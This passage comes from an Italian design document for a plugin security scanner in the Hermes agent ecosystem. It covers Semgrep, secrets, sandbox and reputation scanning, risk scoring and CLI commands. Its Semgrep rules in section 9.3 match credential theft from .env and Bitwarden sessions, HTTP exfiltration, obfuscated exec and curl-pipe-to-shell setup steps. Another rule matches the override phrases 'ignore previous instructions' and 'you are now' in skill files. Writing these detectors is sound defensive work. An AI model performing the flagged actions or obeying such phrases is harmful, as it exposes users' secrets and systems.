    │       ├── risk = medium → ⚠️ DISABLED
    │       │       └── Notifica: "3 plugin disabled, run 'plugin policy' to review"
    │       │
    │       ├── risk = high → 🚫 DISABLED + alert
    │       │       └── Alert: "hermes-payguard has HIGH risk findings"
    │       │
    │       └── risk = critical → ⛔ BLOCKED
    │               └── Alert: "hermes-evil-plugin BLOCKED: credential theft detected"
    │
    ▼
Riepilogo:
  ✅ 12 plugins enabled
  ⚠️  3 plugins disabled (awaiting approval)
  ⛔  1 plugin blocked (critical risk)
```

---

## 8. External Tools Catalog — Riepilogo

### 8.1 Raccomandati (da integrare subito)

| Tool               | Layer | Perché                                                                               |
| ------------------ | ----- | ------------------------------------------------------------------------------------ |
| **Semgrep**        | L1/L2 | SAST multi-linguaggio, 2,500+ regole community, gratuito, offline. Il più versatile. |
| **Bandit**         | L1    | Python-specifico, complementare a Semgrep per regole Python profonde.                |
| **truffleHog**     | L1    | Rilevazione secrets nei repo, verifica entropia. Essenziale.                         |
| **Docker**         | L3    | Sandboxing standard, disponibile ovunque, hardened con `--read-only --network=none`. |
| **VirusTotal API** | L4    | Hash lookup per file sospetti. Opzionale ma potente.                                 |
| **OSSF Scorecard** | L4    | Reputation del repo sorgente. Gratuito, usa GitHub API.                              |

### 8.2 Nice-to-Have (fase 2)

| Tool           | Layer | Perché                                                  |
| -------------- | ----- | ------------------------------------------------------- |
| **Socket.dev** | L4    | Specializzato in supply chain attacks npm/PyPI.         |
| **Snyk**       | L2    | Database vulnerabilità dipendenze con fix advice.       |
| **gVisor**     | L3    | Sandbox più forte di Docker per plugin sospetti.        |
| **Clarvia**    | L4    | AEO scoring per MCP tools (già nell'ecosistema Hermes). |
| **AbuseIPDB**  | L4    | Verifica IP/domini contattati dai plugin.               |

### 8.3 Non Raccomandati

| Tool                                                  | Motivo                                                                          |
| ----------------------------------------------------- | ------------------------------------------------------------------------------- |
| **ClamAV**                                            | Antivirus tradizionale, non rileva malware in codice sorgente Python/JS.        |
| **YARA rules custom**                                 | Richiede manutenzione continua di regole. Overhead non giustificato per fase 1. |
| **Static analysis commerciale (Checkmarx, Veracode)** | Overkill per plugin open-source. Costi proibitivi.                              |

---

## 9. Deep Evaluation: Semgrep as Core SAST Engine

### 9.1 Perché Semgrep è il motore SAST ideale per questo scanner

Semgrep non è solo "un altro tool" — è il candidato migliore come **motore SAST primario**
per il plugin scanner per cinque ragioni fondamentali:

| Criterio               | Semgrep                                                                                                                                       | Alternative                                                             | Verdetto   |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- | ---------- |
| **Multi-linguaggio**   | 30+ linguaggi (Python, JS, TS, Go, Ruby, Java, Dockerfile, YAML, JSON, Terraform)                                                             | Bandit = solo Python; ESLint = solo JS/TS                               | ✅ Semgrep |
| **Regole comunitarie** | 2,500+ regole predefinite nel [Semgrep Registry](https://semgrep.dev/explore), organizzate per categoria (security, correctness, performance) | Bandit = ~70 regole; ESLint = centinaia ma non security-focused         | ✅ Semgrep |
| **Regole custom**      | YAML dichiarativo, sintassi intuitiva. Es: `pattern: os.system(...)` in 3 linee                                                               | Bandit = richiede plugin Python; truffleHog = solo regex                | ✅ Semgrep |
| **Taint tracking**     | Data-flow analysis: traccia dati da `source` a `sink`. Es: `request.get_param() → os.system()`                                                | Bandit = pattern matching semplice, no data flow                        | ✅ Semgrep |
| **Performance**        | Tree-sitter based, scansione incrementale. 10K file in <5 secondi                                                                             | Bandit = AST Python, comparabile; ESLint = più lento su codebase grandi | ✅ Semgrep |
| **Offline-first**      | 100% locale, zero chiamate API. Regole scaricate una volta, eseguite offline                                                                  | VirusTotal = richiede API key + Internet; Snyk = richiede account       | ✅ Semgrep |
| **Supply chain**       | `semgrep supply-chain` usa Advisory DB per vulnerabilità note nelle dipendenze (npm, PyPI, Gem, Maven)                                        | `npm audit`, `pip-audit`, OWASP Dependency Check                        | ✅ Semgrep |

### 9.2 Architettura di Integrazione

```text
┌──────────────────────────────────────────────────────────┐
│                  PLUGIN SECURITY SCANNER                  │
│                                                          │
│  ┌────────────┐  ┌──────────┐  ┌──────────────────────┐ │
│  │ Regex      │  │ AST      │  │ Semgrep Engine       │ │
│  │ Scanner    │  │ Analyzer │  │ (subprocess / JSON)  │ │
│  │ (veloce)   │  │ (Python) │  │                      │ │
│  └─────┬──────┘  └────┬─────┘  │  ┌────────────────┐  │ │
│        │              │         │  │ Registry Rules │  │ │
│        │              │         │  │ (2500+ community│  │ │
│        │              │         │  │  rules, cached) │  │ │
│        │              │         │  └────────┬───────┘  │ │
│        │              │         │           │          │ │
│        │              │         │  ┌────────┴───────┐  │ │
│        │              │         │  │ Custom Rules   │  │ │
│        │              │         │  │ (hermes-plugin │  │ │
│        │              │         │  │  specific)     │  │ │
│        │              │         │  └────────────────┘  │ │
│        └──────────────┴─────────┴──────────────────────┘ │
│                          │                               │
│                          ▼                               │
│               Results Merger & Deduplicator               │
└──────────────────────────────────────────────────────────┘
```

### 9.3 Regole Semgrep Custom per l'Ecosistema Hermes

Oltre alle 2,500+ regole community, lo scanner includerà regole custom specifiche
per i pattern di attacco nell'ecosistema Hermes:

```yaml
rules:
  # ─── CRITICAL: Hermes-specific patterns ───

  - id: hermes-env-exfiltration
    pattern-either:
      - pattern: open("$HOME/.hermes/.env", ...)
      - pattern: open(os.path.expanduser("~/.hermes/..."), ...)
      - pattern: Path("~/.hermes/...").expanduser()
    message: "Tentativo di accesso a file di configurazione Hermes"
    severity: ERROR
    metadata:
      category: credential-access
      threat: env-exfiltration

  - id: hermes-bitwarden-session-steal
    pattern-either:
      - pattern: os.environ.get("BW_SESSION")
      - pattern: os.environ["BW_SESSION"]
      - pattern: os.getenv("VAULTWARDEN_PASSWORD")
    message: "Tentativo di furto sessione Bitwarden/Vaultwarden"
    severity: ERROR
    metadata:
      category: credential-access
      threat: vaultwarden-compromise

  - id: hermes-api-key-exfil
    pattern-either:
      - pattern: requests.post(..., json={..., "key": $K, ...})
      - pattern: $HTTP.post(..., data={..., "token": $T, ...})
    message: "Possibile esfiltrazione API key via HTTP POST"
    severity: ERROR
    metadata:
      category: exfiltration
      threat: credential-exfil

  - id: hermes-plugin-side-loading
    pattern-either:
      - pattern: importlib.import_module($DYNAMIC)
      - pattern: __import__($DYNAMIC)
      - pattern: exec(compile(..., $DYNAMIC, ...))
    message: "Caricamento dinamico di moduli — possibile plugin side-loading"
    severity: WARNING
    metadata:
      category: defense-evasion
      threat: dynamic-code-execution

  - id: hermes-skill-prompt-injection
    pattern-either:
      - pattern: |
          ...
          ignore previous instructions
          ...
      - pattern: |
          ...
          you are now $ROLE
          ...
    paths:
      include:
        - "*.md"
        - "**/SKILL.md"
        - "**/AGENTS.md"
    message: "Possibile prompt injection in file markdown plugin"
    severity: WARNING
    metadata:
      category: prompt-injection
      threat: skill-manipulation

  # ─── HIGH: Generic dangerous patterns ───

  - id: hermes-obfuscated-exec
    pattern-either:
      - pattern: eval(base64.b64decode(...))
      - pattern: exec(zlib.decompress(...))
      - pattern: exec(bytes.fromhex(...).decode())
    message: "Esecuzione di codice offuscato/encodificato"
    severity: ERROR
    metadata:
      category: defense-evasion
      threat: obfuscated-execution

  - id: hermes-network-callback
    pattern-either:
      - pattern: requests.post("http://$HOST:$PORT", ...)
      - pattern: socket.create_connection(($HOST, $PORT))
      - pattern: $HTTP.request("POST", "http://...", ...)
    message: "Connessione di rete a host potenzialmente malevolo"
    severity: WARNING
    metadata:
      category: command-and-control
      threat: network-callback

  - id: hermes-setup-script-dangerous
    pattern-either:
      - pattern: |
          curl ... | bash
      - pattern: |
          wget ... -O - | sh
      - pattern: |
          pip install $PACKAGE
    paths:
      include:
        - "**/setup.sh"
        - "**/install.sh"
        - "**/bootstrap*"
    message: "Comando pericoloso in script di setup"
    severity: ERROR
    metadata:
      category: execution
      threat: malicious-setup
```

### 9.4 Esecuzione di Semgrep come Subprocess

Seguendo il pattern esistente di ops-kit (subprocess-based adapters in `bridge.py`),
Semgrep viene invocato come subprocess con output JSON:

```python
# Pattern (non implementazione — seguire il modello di bridge.py)
import subprocess, json

def run_semgrep(plugin_path: str, rules_path: str, categories: list[str]) -> dict:
    """Invoke Semgrep with category-filtered rules, return structured findings."""
    cmd = [
        "semgrep", "scan",
        "--config", rules_path,       # Custom rules
        "--config", "p/security",      # Community security rules
        "--config", "p/secrets",       # Community secret rules
        "--json",
        "--no-git-ignore",
        "--max-target-bytes", "5000000",
        plugin_path
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return json.loads(result.stdout)
```

### 9.5 Caching delle Regole Semgrep

Le regole Semgrep community vengono scaricate una volta e cachate localmente:

```text
~/.hermes/ops-kit/semgrep/
├── rules_cache/
│   ├── p-security.yaml        # Community security rules
│   ├── p-secrets.yaml         # Community secret rules
│   ├── p-supply-chain.yaml    # Supply chain rules
│   └── .cache_version         # ETag / last fetch timestamp
├── custom/
│   ├── hermes-critical.yaml   # Regole custom Hermes (ERROR)
│   ├── hermes-warning.yaml    # Regole custom Hermes (WARNING)
│   └── hermes-info.yaml       # Regole custom Hermes (INFO)
└── registry_index.json        # Indice regole disponibili
```

Aggiornamento regole: `hermes-ops-kit plugin scanner update-rules` (fetch ultime regole community).

### 9.6 Semgrep Supply Chain per Dipendenze

Oltre all'analisi del codice, Semgrep offre `semgrep supply-chain` che analizza
i file di lock delle dipendenze contro l'Advisory Database:

```bash
semgrep supply-chain --config p/supply-chain --json <plugin_path>
```

Questo rileva vulnerabilità note in:

- `requirements.txt`, `Pipfile.lock`, `poetry.lock` (Python)
- `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` (Node.js)
- `Gemfile.lock` (Ruby)
- `pom.xml` (Maven/Java)

**Vantaggio rispetto a `npm audit` / `pip-audit`:** Un unico tool per tutti i linguaggi,
stesso formato output, integrato nello stesso flusso di scansione.

---

## 10. Multi-Option Scan Configuration System

### 10.1 Scan Categories Architecture

Invece di un singolo flusso di scansione monolitico, lo scanner è organizzato in
**scan categories** indipendenti e componibili. Ogni categoria è un'unità di scansione
con i propri tool, regole, peso di rischio, e può essere abilitata/disabilitata
selettivamente in base al contesto (startup, install, update, manual).

```text
      ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
      │   SECRETS    │    │   POLICY     │    │    CODE      │
      │   CATEGORY   │    │   CATEGORY   │    │   CATEGORY   │
      │              │    │              │    │              │
      │ Tools:       │    │ Tools:       │    │ Tools:       │
      │ • truffleHog │    │ • Semgrep    │    │ • Semgrep    │
      │ • gitleaks   │    │ • Bandit     │    │ • ESLint     │
      │ • regex pttn │    │ • AST scan   │    │ • AST density│
      │              │    │              │    │ • entropy    │
      └──────┬───────┘    └──────┬───────┘    └──────┬───────┘
             │                   │                   │
      ┌──────┴───────┐    ┌──────┴───────┐    ┌──────┴───────┐
      │  DEPENDENCIES│    │   BEHAVIOR   │    │  REPUTATION  │
      │   CATEGORY   │    │   CATEGORY   │    │   CATEGORY   │
      │              │    │              │    │              │
      │ Tools:       │    │ Tools:       │    │ Tools:       │
      │ • Semgrep SC │    │ • Docker     │    │ • VirusTotal │
      │ • npm audit  │    │ • strace     │    │ • OSSF Score │
      │ • pip-audit  │    │ • seccomp    │    │ • Socket.dev │
      └──────────────┘    └──────────────┘    └──────────────┘
```

### 10.2 Dettaglio delle 6 Scan Categories

#### CATEGORY 1: `secrets` — Rilevazione Credenziali

| Attributo                   | Valore                                                           |
| --------------------------- | ---------------------------------------------------------------- |
| **Scopo**                   | Trovare API key, token, password, session key hardcoded nei file |
| **Default risk on failure** | `critical`                                                       |
| **Tempo tipico**            | 1-3 secondi                                                      |

| Tool               | Metodo                                  | Forza                                                            | Debolezza                             |
| ------------------ | --------------------------------------- | ---------------------------------------------------------------- | ------------------------------------- |
| **truffleHog**     | Entropy + regex + git history scan      | Rileva secrets in tutto l'history git, non solo HEAD             | Lento su repo grandi se non cachato   |
| **gitleaks**       | Regex ruleset + entropy                 | Preconfigurato per 150+ tipi di secrets (AWS, GCP, GitHub, etc.) | Solo HEAD (non history) di default    |
| **regex patterns** | `security/redaction.py` patterns estesi | Istantaneo, integrato con ops-kit                                | No entropy check, più false positives |

#### CATEGORY 2: `policy` — Violazioni di Policy

| Attributo                   | Valore                                                                      |
| --------------------------- | --------------------------------------------------------------------------- |
| **Scopo**                   | Identificare pattern di codice che violano policy di sicurezza dichiarative |
| **Default risk on failure** | `high`                                                                      |
| **Tempo tipico**            | 2-5 secondi                                                                 |

| Tool                       | Metodo                            | Forza                                           | Debolezza                            |
| -------------------------- | --------------------------------- | ----------------------------------------------- | ------------------------------------ |
| **Semgrep (custom rules)** | Pattern matching + taint tracking | 2,500+ regole community + custom Hermes         | Richiede download iniziale regole    |
| **Bandit**                 | AST walker Python                 | Leggero, zero-dependency, integrato nativamente | Solo Python                          |
| **AST import scanner**     | `ast.NodeVisitor` custom          | Granularità fine su import dinamici             | Manutenzione regole custom richiesta |

Regole di policy coperte:

- `shell-execution` — `os.system()`, `subprocess.call()`, backtick execution
- `dynamic-import` — `__import__()`, `importlib.import_module()`, `exec()`, `eval()`
- `network-access` — `socket`, `requests`, `urllib`, `http.client` non dichiarati
- `file-system-write` — `open(..., 'w')`, `shutil.copy`, `pathlib.Path.write`
- `env-access` — lettura `os.environ`, `os.getenv()` su variabili Hermes
- `prompt-injection` — pattern in SKILL.md, AGENTS.md, CLAUDE.md

#### CATEGORY 3: `code` — Qualità e Offuscamento Codice

| Attributo                   | Valore                                                                 |
| --------------------------- | ---------------------------------------------------------------------- |
| **Scopo**                   | Rilevare codice offuscato, minimizzato, o intenzionalmente illeggibile |
| **Default risk on failure** | `medium`                                                               |
| **Tempo tipico**            | 2-4 secondi                                                            |

| Tool                       | Metodo                                 | Forza                                               | Debolezza                                          |
| -------------------------- | -------------------------------------- | --------------------------------------------------- | -------------------------------------------------- |
| **Shannon entropy**        | Calcolo entropia per file              | Detecta base64, zlib, codice encrypted              | False positive su file binari legittimi (immagini) |
| **AST density**            | Rapporto nodi AST / linee di codice    | Detecta one-liner offuscati, minified JS            | Richiede parser per ogni linguaggio                |
| **Variable name entropy**  | Distribuzione lunghezza nomi variabili | Codice offuscato ha nomi short/non-semantici        | Legittimo in code golf o script compatti           |
| **Semgrep (code-quality)** | Regole `p/quality` community           | Trova dead code, complexity eccessiva, anti-pattern | Non è security-focused                             |
| **ESLint**                 | Regole JS/TS per code quality          | Ecosistema ricco di plugin                          | Solo JavaScript/TypeScript                         |

#### CATEGORY 4: `dependencies` — Supply Chain delle Dipendenze

| Attributo                   | Valore                                                                          |
| --------------------------- | ------------------------------------------------------------------------------- |
| **Scopo**                   | Verificare che le dipendenze (npm, PyPI, Gem) non contengano vulnerabilità note |
| **Default risk on failure** | `high`                                                                          |
| **Tempo tipico**            | 3-8 secondi                                                                     |

| Tool                       | Metodo                      | Forza                                    | Debolezza                       |
| -------------------------- | --------------------------- | ---------------------------------------- | ------------------------------- |
| **Semgrep Supply Chain**   | Advisory DB cross-ecosystem | Unico tool per npm + PyPI + Gem + Maven  | Richiede lock file presente     |
| **npm audit**              | NPM Advisory DB             | Ufficiale, integrato in npm              | Solo Node.js                    |
| **pip-audit / safety**     | PyPA Advisory DB            | Ufficiale Python                         | Solo Python                     |
| **OWASP Dependency Check** | NVD (CVE) database          | Copertura CVE completa, multi-linguaggio | Lento (scarica DB NVD), pesante |

#### CATEGORY 5: `behavior` — Analisi Comportamentale (Sandbox) · _opzionale, disabilitata di default (Fase 3)_

| Attributo                   | Valore                                                               |
| --------------------------- | -------------------------------------------------------------------- |
| **Scopo**                   | Eseguire il plugin in sandbox e osservare syscall, network, file I/O |
| **Default risk on failure** | `critical`                                                           |
| **Tempo tipico**            | 10-30 secondi                                                        |

| Tool                  | Metodo                                         | Forza                                        | Debolezza                                 |
| --------------------- | ---------------------------------------------- | -------------------------------------------- | ----------------------------------------- |
| **Docker (hardened)** | Container read-only, no network, no privileges | Standard, disponibile ovunque                | Startup ~2-5s, richiede Docker installato |
| **Firejail**          | Linux namespaces + seccomp                     | Leggero (~0.5s startup)                      | Solo Linux                                |
| **strace**            | Tracciamento syscall                           | Vede esattamente cosa fa il processo         | Output verboso, richiede parsing          |
| **seccomp**           | Filtro syscall a livello kernel                | Blocca syscall pericolose prima che accadano | Complesso da configurare                  |

Cosa viene monitorato nel sandbox:

- **Syscall bloccate:** `execve`, `fork`, `clone`, `unshare`, `mount`, `ptrace`
- **File access:** Tentativi di apertura file fuori dal plugin directory
- **Network:** Qualsiasi tentativo di connessione (con `--network=none`)
- **Env vars:** Accesso a `HOME`, `HERMES_*`, `BW_*`, `VAULTWARDEN_*`
- **Exit code:** Plugin che termina con segnale (crash) vs exit pulito

#### CATEGORY 6: `reputation` — Threat Intelligence Esterna · _OSSF/GitHub gratuiti; VirusTotal/Socket.dev opzionali (richiedono API key, Fase 3)_

| Attributo                   | Valore                                                                     |
| --------------------------- | -------------------------------------------------------------------------- |
| **Scopo**                   | Verificare la reputazione del repo sorgente e dei file tramite API esterne |
| **Default risk on failure** | `medium`                                                                   |
| **Tempo tipico**            | 1-5 secondi (API roundtrip)                                                |

| Tool                   | Metodo                                                                        | Forza                                     | Debolezza                                           |
| ---------------------- | ----------------------------------------------------------------------------- | ----------------------------------------- | --------------------------------------------------- |
| **OSSF Scorecard**     | 18 metriche automatiche (CI, fuzzing, SAST, signed releases, vulnerabilities) | Gratuito, usa GitHub API, nessuna API key | Richiede repo pubblico su GitHub                    |
| **VirusTotal**         | 70+ antivirus engines su hash file                                            | Database vastissimo, API ben documentata  | Rate limit (500 lookups/day free), richiede API key |
| **Socket.dev**         | Supply chain risk: malware, typo-squatting, protestware, telemetry            | Specializzato npm/PyPI, scoring 0-100     | Free tier limitato (100 scans/month)                |
| **GitHub Advisory DB** | Query GraphQL per CVE nelle dipendenze                                        | Gratuito, sempre aggiornato               | Solo vulnerabilità note, non malware nuovo          |

### 10.3 Scan Profiles: Quando e Cosa Scansionare

I **profili di scansione** definiscono quali categorie eseguire in base al contesto
operativo, con timeout differenziati:

```yaml
# ~/.hermes/ops-kit/plugin_scanner.yaml

scan_profiles:
  # ─── Avvio Hermes: veloce, essenziale ───
  startup:
    description: "Eseguito ad ogni avvio di Hermes"
    categories:
      - secrets # critical: trova API key in chiaro
      - policy # high: shell exec, dynamic import
      - dependencies # high: vulnerabilità note nelle dipendenze
    timeout_seconds: 12
    parallel: true # Esegue le categorie in parallelo
    block_on: [critical, high]
    cache_ttl_hours: 168 # 7 giorni

  # ─── Installazione nuovo plugin: approfondito ───
  install:
    description: "Eseguito al primo clone di un plugin"
    categories:
      - secrets
      - policy
      - code # medium: controlla offuscamento
      - dependencies
      - reputation # medium: controlla repo sorgente
    timeout_seconds: 60
    parallel: true
    block_on: [critical, high]

  # ─── Aggiornamento plugin: massima profondità ───
  update:
    description: "Eseguito ad ogni git pull / aggiornamento plugin"
    categories:
      - secrets
      - policy
      - code
      - dependencies
      - behavior # critical: sandbox execution
      - reputation
    timeout_seconds: 120
    parallel: false # Sequenziale: prima static, poi behavior
    block_on: [critical, high]

  # ─── Scansione manuale: tutto ───
  manual:
    description: "Scansione completa su richiesta"
    categories:
      - secrets
      - policy
      - code
      - dependencies
      - behavior
      - reputation
    timeout_seconds: 300
    parallel: false
    block_on: [critical]

  # ─── CI/CD pipeline: solo offline ───
  ci:
    description: "Per CI/CD, solo tool locali (no API calls)"
    categories:
      - secrets
      - policy
      - code
      - dependencies
    timeout_seconds: 60
    parallel: true
    block_on: [critical]
```

### 10.4 Category → Tools Mapping Matrix

La matrice completa di quali tool vengono usati per ogni categoria,
con i flag di configurazione:

```yaml
# ~/.hermes/ops-kit/plugin_scanner.yaml (continua)

categories:
  secrets:
    enabled: true
    tools:
      trufflehog:
        enabled: true
        args: ["--no-verification", "--json"]
        risk_weight: 10
      gitleaks:
        enabled: true
        args: ["detect", "--no-git", "--format=json"]
        risk_weight: 8
      regex_patterns:
        enabled: true
        risk_weight: 5
    threshold:
      score: 15 # Score aggregato > 15 → CRITICAL
      single_finding: critical # Un singolo finding critico → CRITICAL

  policy:
    enabled: true
    tools:
      semgrep:
        enabled: true
        configs:
          - "p/security"
          - "p/secrets"
          - "custom/hermes-critical.yaml"
          - "custom/hermes-warning.yaml"
        risk_weight: 10
      bandit:
        enabled: true
        args: ["-ll", "-f", "json"]
        risk_weight: 5
      ast_import_scanner:
        enabled: true
        risk_weight: 3
    threshold:
      score: 12

  code:
    enabled: true
    tools:
      entropy_analyzer:
        enabled: true
        max_entropy: 6.0 # Shannon entropy max prima di flaggare
        risk_weight: 5
      ast_density:
        enabled: true
        max_density: 0.8 # Nodi AST / linee di codice
        risk_weight: 3
      semgrep:
        enabled: true
        configs:
          - "p/quality"
          - "p/best-practices"
        risk_weight: 4
      eslint:
        enabled: false # Opzionale, richiede Node.js
        risk_weight: 3
    threshold:
      score: 10

  dependencies:
    enabled: true
    tools:
      semgrep_supply_chain:
        enabled: true
        configs: ["p/supply-chain"]
        risk_weight: 10
      npm_audit:
        enabled: true
        args: ["--json"]
        risk_weight: 5
      pip_audit:
        enabled: true
        risk_weight: 5
    threshold:
      score: 12
      severity_filter: ["critical", "high"] # Ignora medium/low nelle dipendenze

  behavior:
    enabled: false # Disabilitato di default (pesante)
    tools:
      docker_sandbox:
        enabled: true
        image: "hermes-scanner-sandbox:latest"
        timeout_per_plugin: 30
        risk_weight: 15
      strace_monitor:
        enabled: true
        risk_weight: 8
    threshold:
      score: 15

  reputation:
    enabled: true
    tools:
      ossf_scorecard:
        enabled: true
        min_score: 5.0 # Score minimo accettabile
        risk_weight: 5
      virustotal:
        enabled: false # Opzionale, richiede API key
        api_key_env: "VIRUSTOTAL_API_KEY"
        risk_weight: 10
      socket_dev:
        enabled: false # Opzionale, richiede API key
        api_key_env: "SOCKET_DEV_API_KEY"
        risk_weight: 8
      github_advisory:
        enabled: true
        risk_weight: 5
    threshold:
      score: 8
```

### 10.5 Scoring Algorithm

Ogni finding ha un **risk_weight** definito nella configurazione dei tool.
Lo score aggregato per categoria è:

```text
category_score = Σ (finding.risk_weight × finding.severity_multiplier)

severity_multiplier:
  ERROR   = 1.0
  WARNING = 0.6
  INFO    = 0.3
```

Lo score complessivo del plugin è:

```text
plugin_risk_score = Σ (category_score × category_weight)

category_weight:
  secrets       = 2.0
  policy        = 1.5
  dependencies  = 1.5
  behavior      = 2.0
  code          = 1.0
  reputation    = 0.8
```

**Decisione finale:**

| Plugin Risk Score | Risk Level | Azione                     |
| ----------------- | ---------- | -------------------------- |
| ≥ 50              | CRITICAL   | BLOCK immediato            |
| 25–49             | HIGH       | BLOCK (override possibile) |
| 10–24             | MEDIUM     | WARN + richiedi conferma   |
| 1–9               | LOW        | ALLOW con notifica         |
| 0                 | NONE       | ALLOW silenzioso           |

### 10.6 CLI Design Aggiornato per Categories

```bash
# Scansione per categorie
hermes-ops-kit plugin scan                                    # Profilo "startup" (default)
hermes-ops-kit plugin scan --profile install                  # Profilo "install"
hermes-ops-kit plugin scan --profile update                   # Profilo "update"
hermes-ops-kit plugin scan --profile manual                   # Tutte le categorie

# Scansione selettiva per categoria
hermes-ops-kit plugin scan --category secrets                 # Solo secrets
hermes-ops-kit plugin scan --category secrets,policy          # Secrets + policy
hermes-ops-kit plugin scan --category all --no-behavior       # Tutto tranne behavior

# Per-plugin
hermes-ops-kit plugin scan --plugin hermes-plugins            # Plugin specifico
hermes-ops-kit plugin scan --plugin "*/42-evey/*"             # Glob pattern

# Tool-specific
hermes-ops-kit plugin scan --tool semgrep                     # Solo Semgrep
hermes-ops-kit plugin scan --tool trufflehog --tool bandit    # Multi-tool

# Output
hermes-ops-kit plugin scan --json                             # Machine-readable
hermes-ops-kit plugin scan --summary                          # Riepilogo
hermes-ops-kit plugin scan --verbose                          # Tutti i findings
hermes-ops-kit plugin scan --explain                          # Spiega ogni finding

# Gestione configurazione
hermes-ops-kit plugin config show                             # Mostra config corrente
hermes-ops-kit plugin config init                             # Genera config default
hermes-ops-kit plugin config set categories.secrets.enabled false
hermes-ops-kit plugin config set categories.behavior.enabled true
hermes-ops-kit plugin config profile startup --add-category code
hermes-ops-kit plugin config profile startup --timeout 20

# Gestione regole
hermes-ops-kit plugin rules update                            # Aggiorna regole Semgrep + custom
hermes-ops-kit plugin rules list                              # Lista regole disponibili
hermes-ops-kit plugin rules test --category secrets           # Dry-run regole su plugin
```

---

## 11. Integrazione con hermes-ops-kit

### 11.1 Dove si inserisce

```text
hermes-ops-kit/
├── security/
│   ├── redaction.py               # Esistente — da estendere con pattern plugin
│   ├── secret_scanner.py          # Esistente — da riutilizzare
│   ├── secret_backend.py          # Esistente
│   └── plugin_scanner/            # NUOVO MODULO
│       ├── __init__.py
│       ├── scanner.py              # Orchestratore categorie + profili
│       ├── cache.py                # SHA-256 cache SQLite
│       ├── categories/
│       │   ├── __init__.py
│       │   ├── secrets.py          # Categoria: secrets (truffleHog, gitleaks, regex)
│       │   ├── policy.py           # Categoria: policy (Semgrep, Bandit, AST)
│       │   ├── code.py             # Categoria: code quality (entropy, density, ESLint)
│       │   ├── dependencies.py     # Categoria: dependencies (Semgrep SC, npm/pip audit)
│       │   ├── behavior.py         # Categoria: behavior (Docker sandbox, strace)
│       │   └── reputation.py       # Categoria: reputation (OSSF Scorecard, VirusTotal)
│       ├── engines/
│       │   ├── semgrep_runner.py   # Subprocess wrapper per Semgrep
│       │   ├── trufflehog_runner.py
│       │   └── bandit_runner.py
│       ├── rules/
│       │   ├── hermes-critical.yaml # Regole Semgrep custom (ERROR)
│       │   ├── hermes-warning.yaml  # Regole Semgrep custom (WARNING)
│       │   └── hermes-info.yaml     # Regole Semgrep custom (INFO)
│       └── plugin_scanner.yaml     # Configurazione categorie + profili
├── policy/
│   ├── engine.py                   # Esistente — aggiungere check_plugin()
│   └── rules.yaml                  # Esistente — aggiungere sezione plugin_security
├── commands.py                     # Esistente — aggiungere subcomandi plugin
└── config/
    └── plugin_scanner.default.yaml # Configurazione default distribuibile
```

### 11.2 CLI Design

La CLI è documentata in dettaglio nella sezione [10.6](#106-cli-design-aggiornato-per-categories).
Riepilogo comandi principali:

```bash
hermes-ops-kit plugin scan                          # Profilo "startup"
hermes-ops-kit plugin scan --profile install        # Profilo "install"
hermes-ops-kit plugin scan --category secrets,policy # Categorie specifiche
hermes-ops-kit plugin scan --tool semgrep           # Tool specifico
hermes-ops-kit plugin config show                   # Configurazione corrente
hermes-ops-kit plugin rules update                  # Aggiorna regole Semgrep
hermes-ops-kit plugin cache stats                   # Statistiche cache SHA
hermes-ops-kit plugin audit --json                  # Audit completo
```

### 11.3 Hook di Integrazione (Hermes Startup)

Gli hook di Hermes usano i profili di scansione definiti in §10.3 invece
di riferimenti diretti ai layer:

```yaml
# ~/.hermes/config.yaml
hooks:
  on_startup:
    - plugin: hermes-ops-kit
      hook: plugin_security_scan
      config:
        profile: startup # secrets + policy + dependencies
        block_on: [critical, high]
        timeout_seconds: 12

  on_plugin_install:
    - plugin: hermes-ops-kit
      hook: plugin_security_scan
      config:
        profile: install # + code + reputation
        block_on: [critical, high]

  on_plugin_update:
    - plugin: hermes-ops-kit
      hook: plugin_security_scan
      config:
        profile: update # + behavior (sandbox)
        block_on: [critical, high]

  on_plugin_uninstall:
    - plugin: hermes-ops-kit
      hook: plugin_cache_cleanup # Rimuove entry dalla cache
```

### 11.4 Riutilizzo Infrastruttura Esistente

| Componente esistente             | Come viene riutilizzato                                                                          |
| -------------------------------- | ------------------------------------------------------------------------------------------------ |
| `security/secret_scanner.py`     | `SECRET_PATTERNS` + `FORBIDDEN_BLOCK_PATTERNS` estesi con pattern plugin                         |
| `security/redaction.py`          | `redact()` per sanitizzare output audit                                                          |
| `mcp/classifier.py`              | `detect_capabilities()`, `classify_risk()`, `INJECTION_PATTERNS` — estesi per plugins            |
| `policy/engine.py`               | `PolicyDecision` (allow/deny/require_approval), `scan_for_secrets()`                             |
| `policy/rules.yaml`              | Nuova sezione `plugin_security` con regole dichiarative per categorie                            |
| `ui/console.py`                  | Output formattato delle scansioni per categoria                                                  |
| `ui/json_output.py`              | Envelope `{ok, result, warnings, errors}` per output machine-readable                            |
| `security/secret_scanner.py`     | `assert_clean(content, sink=...)` come gate prima di scrivere report/audit verso Obsidian o log  |
| `security/file_permissions.py`   | `verify_permissions()` / `check_env_file()` per verificare che i plugin non siano world-writable |
| `bridge.py` (pattern subprocess) | Invocazione tool esterni (Semgrep, truffleHog) via subprocess + JSON stdout                      |

### 11.5 Flusso di Configurazione

```text
Primo avvio / Init
    │
    ▼
hermes-ops-kit plugin config init
    │  Genera ~/.hermes/ops-kit/plugin_scanner.yaml da default
    ▼
Utente personalizza (opzionale)
    │  hermes-ops-kit plugin config set categories.behavior.enabled true
    ▼
Semgrep first-use
    │  hermes-ops-kit plugin rules update
    │  Scarica regole community da Semgrep Registry (~10MB)
    │  Cache in ~/.hermes/ops-kit/semgrep/rules_cache/
    ▼
Pronto per la prima scansione
    │  hermes-ops-kit plugin scan --profile manual
    ▼
Cache SHA popolata per tutti i plugin
```

---

## 12. Flusso Operativo

### 12.1 All'avvio di Hermes

```text
1. Hermes starts
2. Hook on_startup → plugin_security_scan
3. Scanner enumera ~/.hermes/plugins/* e ~/.hermes/skills/*
4. Per ogni plugin:
   a. Calcola git_commit_hash + file_tree_sha
   b. Cerca in cache SQLite
   c. Se trovato e valido → skip
   d. Se non trovato → esegue L0→L1→L2 in sequenza
   e. Se L1 o L2 falliscono → BLOCK, notifica utente
   f. Se passano → salva in cache, ALLOW
5. Report riepilogativo a utente
6. Hermes completa avvio solo con plugin allowed
```

### 12.2 All'installazione/aggiornamento di un plugin

```text
1. Plugin installato/aggiornato (git pull / clone)
